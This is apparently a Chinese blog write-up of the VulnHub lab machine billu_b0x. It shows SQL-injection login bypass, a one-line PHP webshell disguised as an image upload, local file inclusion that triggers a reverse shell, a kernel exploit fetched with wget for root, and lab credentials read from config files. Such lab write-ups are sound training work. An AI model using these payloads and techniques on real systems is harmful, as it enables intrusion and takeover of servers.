---
title: VulnHub-11-billu-b0x
author: 干 脆 面
tags:
  - "靶机\U0001F3AF"
  - "VulnHub\U0001F3AF"
categories:
  - "安全\U0001F510"
top: 16
abbrlink: db530782
date: 2022-08-15 10:10:55
---

>靶机：https://www.vulnhub.com/entry/billu-b0x,188/
>
>难度：中
>
>目标：获取root权限
>
>备注：导入靶机时保留原始MAC地址不变（包含所有网卡的MAC地址）

<!-- more -->

## 方法一

### 主机发现

```
sudo arp-scan -l
```

![image-20220401110030660](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401110030660.png)

### 端口扫描

```
sudo nmap -p- 192.168.1.108
```

![image-20220401110123984](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401110123984.png)

### 服务探测

```
sudo nmap -p22,80 -sV -sC 192.168.1.108
```

![image-20220401110158074](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401110158074.png)

### 访问80端口

访问http://192.168.1.108:80

页面提示使用SQL注入

### SQL注入

![image-20220401111000636](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401111000636.png)

进行了简单的手动注入测试，并没有在页面发现有用的回显信息

![image-20220401111103575](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401111103575.png)

burp抓包放到sqlmap跑一下（并未能跑出想要的结果）

```
sqlmap -r 1.txt --batch --random-agent --level=3
```

![image-20220706161817115](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706161817115.png)

把数据包发送至Intruder模块尝试爆破

![image-20220706162606247](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706162606247.png)

选取针对SQL注入的字典**/SecLists-2021.4/Fuzzing/SQLi/Generic-SQLi.txt**和**Burp专业版自带的SQL注入字典**

![image-20220706163253920](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706163253920.png)

![image-20220706163336960](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706163336960.png)

再结合之前登录错误的提示Try again进行筛选配置

![image-20220706163630006](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706163630006.png)

![image-20220706163944385](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706163944385.png)

筛选后看到页面响应为You are allowed

![image-20220706164441029](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706164441029.png)

![image-20220706164535988](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706164535988.png)

将请求内容填入登陆窗口成功登陆

![image-20220706164643296](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706164643296.png)

发现页面有查看用户和添加用户两个功能

![image-20220706165316773](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706165316773.png)

![image-20220706165329493](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706165329493.png)

添加用户这里存在上传点，看是否存在文件上传漏洞

### 文件上传

创建一句话木马a.php

```
<?php system($_GET["cmd"]);?>
```

![image-20220706165754115](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706165754115.png)

![image-20220706165802442](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706165802442.png)

提示只能上传png,jpg格式

看服务端是否只是根据扩展名来检验

![image-20220706170040234](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170040234.png)

尝试修改文件格式、文件类型和文件头后成功上传

![image-20220706170433124](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170433124.png)

重新查看用户列表

![image-20220706170508716](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170508716.png)

尝试访问图片发现确实存在该文件

![image-20220706170615225](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170615225.png)

访问/uploaded_images目录

![image-20220706170830740](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170830740.png)

### 目录扫描

```
dirsearch -u http://192.168.1.108
```

![image-20220706171624866](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706171624866.png)

访问add.php和add发现和刚才的添加用户界面一致，猜测在添加用户界面可能是调用了这俩个页面

抓取访问添加用户界面的请求数据包

![image-20220706172036258](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706172036258.png)

猜测load参数的值即为请求页面，是否存在本地的文件包含呢？

### 文件包含

进行简单的测试

load参数正常请求add 页面正常返回

![image-20220706172648635](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706172648635.png)

load参数请求adddddd 页面返回为空

![image-20220706172752334](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706172752334.png)

load参数请求../../../../etc/passwd 成功访问到/etc/passwd文件

![image-20220706172945773](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706172945773.png)

此时再尝试能否结合文件包含漏洞访问之前上传的一句话木马(路径/uploaded_images/a.png)

load参数请求http://192.168.1.108/uploaded_images/a.png?cmd=id 返回为空

![image-20220706173401910](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706173401910.png)

load参数请求uploaded_images/a.png?cmd=id 返回依然为空

![image-20220706173459689](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706173459689.png)

思考：是否服务端不能解析刚才上传的一句话木马呢？

尝试：重新上传反弹shell的图片木马（/usr/share/webshells/php/php-reverse-shell.php）

![image-20220706174001408](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174001408.png)

![image-20220706174035924](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174035924.png)

仍然添加图片头部

![image-20220706174153940](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174153940.png)

以及修改配置为kali的ip和监听端口



![image-20220706174245307](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174245307.png)

Forward成功上传

![image-20220706174448747](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174448747.png)

路径下也确实存在了b.png

![image-20220706174527217](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174527217.png)

本地监听4444端口

![image-20220706174646448](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174646448.png)

Burp内重新提交 load参数请求uploaded_images/b.png 的数据包 看服务端能否成功解析

成功反弹shell并优化 用户为普通权限

![image-20220706175003380](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706175003380.png)

### 内核提权

```
uname -a
```

![image-20220706175131336](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706175131336.png)

有印象之前这个内核版本可以直接提权 使用kali搜索该内核版本提权利用脚本

![image-20220706175713563](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706175713563.png)

exp.c目录下启动http服务再在目标上利用wget获取exp.c

![image-20220706175921378](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706175921378.png)

![image-20220706180153436](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706180153436.png)

gcc编译exp.c为二进制文件并赋予其执行权限

![image-20220706180338485](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706180338485.png)

提权成功

## 方法二

回到目录扫描结果

![image-20220706171624866](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706171624866.png)

### 任意文件读取

访问/test.php

![image-20220706180957428](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706180957428.png)

页面提示file参数为空 请提供文件路径

尝试构造test.php?file=/etc/passwd和?file=../../../../etc/passwd 返回结果不变

![image-20220706181243209](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181243209.png)

![image-20220706181302715](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181302715.png)

尝试改变GET请求方式为POST请求方式重新执行后 成功读取了/etc/passwd文件

![image-20220706181412320](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181412320.png)

![image-20220706181445598](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181445598.png)

再次尝试file参数后能否请求其他类型的值或者文件

如访问之前的add.php 成功读取到了add.php的源代码

![image-20220706181750787](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181750787.png)

也就意味着可以利用此漏洞读取目标服务器上的所有文件的源代码

试着读取主页面文件index.php 成功读取

![image-20220706182127346](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706182127346.png)

### 代码审计

```
if(isset($_POST['login']))
{
	$uname=str_replace('\'','',urldecode($_POST['un']));
	//将用户在客户端以POST方式提交的变量un会进行URL解码并使用str_replace将其中的\'替换为空再赋值给服务端变量uname
	$pass=str_replace('\'','',urldecode($_POST['ps']));
	//将用户在客户端以POST方式提交的变量ps会进行URL解码并使用str_replace将其中的\'替换为空再赋值给服务端变量pass
	$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
	//在未做变量过滤，只替换了\'的情况下，直接将uname和pass两个变量带入执行数据库查询语句（SQL注入漏洞:可构造$run='select * from auth where pass=' ' and uname=' or 0=0# ）
	$result = mysqli_query($conn, $run);
if (mysqli_num_rows($result) > 0) {

$row = mysqli_fetch_assoc($result);
	   echo "You are allowed<br>";
	   $_SESSION['logged']=true;
	   $_SESSION['admin']=$row['username'];
	   
	 header('Location: panel.php', true, 302);
   
}
else
{
	echo "<script>alert('Try again');</script>";
}
	
}
```

### 配置文件读取

继续读取c.php发现其是数据库连接配置文件 得到了数据库账号密码库名等信息

![image-20220706183914586](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706183914586.png)

访问之前的目录扫描结果\phpmy\ 发现数据库后台

![image-20220706184051272](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706184051272.png)

输入刚才获取到的账号billu密码b0x_billu成功登陆

在auth表内发现新的一组用户名密码  经验证发现是index.php页面的用户名biLLu密码hEx_it

![image-20220707091928522](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220707091928522.png)

继续对/phpmy/目录下的文件进行爬取

```
dirsearch -u http://192.168.1.108/phpmy/
```

![image-20220706184902945](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706184902945.png)

访问配置文件config.inc.php 发现用户名密码

![image-20220706185112022](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706185112022.png)

经验证发现是目标的root用户的账号密码

![image-20220706185439437](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706185439437.png)
